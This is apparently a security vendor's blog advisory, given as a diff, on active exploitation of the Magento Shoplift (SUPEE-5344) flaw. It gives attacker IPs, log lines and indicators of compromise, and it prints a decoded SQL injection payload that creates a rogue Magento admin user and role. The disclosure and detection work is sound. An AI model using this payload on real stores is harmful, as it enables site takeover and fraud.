@@ -1,0 +1,25 @@
+Magento Shoplift (SUPEE-5344) Exploits in the Wild
+
+As warned a few days ago, the Magento Shoplift (SUPEE-5344) vulnerability details have been disclosed by the CheckPoint team. They show step by step how it can be exploited to take over a vulnerable Magento site.
+They have prepared the following video showing a Proof of Concept (PoC) in which they create a fake coupon:
+
+That’s a simple example. This vulnerability can be exploited in much more devastating ways.
+Magento ShopLift in the Wild
+As expected, it is now actively being exploited.
+In less than 24 hours since the disclosure, we have started to see attacks via our WAF logs trying to exploit this vulnerability. It seems to be coming from a specific crime group, since they all look the same:
+
+62.76.177.179 – – [23/Apr/2015:00:45:44 -0400] “POST /index.php/admin/Cms_Wysiwyg/[HIDDEN] HTTP/1.1” 403 1880 “-” “Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36”
+185.22.232.218 – – [22/Apr/2015:00:42:38 -0400] “POST /index.php/admin/Cms_Wysiwyg/[HIDDEN] HTTP/1.1” 200 2211 “-” “Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20130101 Firefox/10.0”
+And always from these two IP addresses from Russia: 62.76.177.179 and 185.22.232.218. If you look for them in your logs, you can see if you have been attacked by the same group.
+Our research team was able to catch and analyze their exploit. So far, it is only trying to create a fake admin user inside the Magento database, which they will certainly misuse later to take over of the site. This is the decoded exploit:
+popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);
+SET @SALT = “rp”;
+SET @PASS = CONCAT(MD5(CONCAT( @SALT , ‘123’) ), CONCAT(‘:’, @SALT ));
+SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
+INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES (‘Firstname’,’Lastname’,”email@example.com”,’ypwq‘,@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
+INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,’U’,(SELECT user_id FROM admin_user WHERE username = ‘ypwq’),’Firstname’); —
+The code is leveraging SQL Injection (SQLi) and inserting a new admin_user to the database. If you suspect you have been compromised, look for the usernames vpwq or defaultmanager as it seems to be the ones being used by this specific group so far.
+Note that we are hiding some of the details and payloads, to make it hard for someone else to copy and create an exploit out of it. However, some groups already have an exploit and are attacking as many sites as they can, and pretty fast.
+Protect your Magento site!
+If you haven’t patched it yet, you are likely already compromised or will be soon. I recommend patching and adding your site behind a Web Application Firewall or Intrusion Detection System to stop these attacks for you.
+If you’re in need of a solution, don’t hesitate to inquire about our Website Firewall; this vulnerability has been virtually patched for all existing customers.
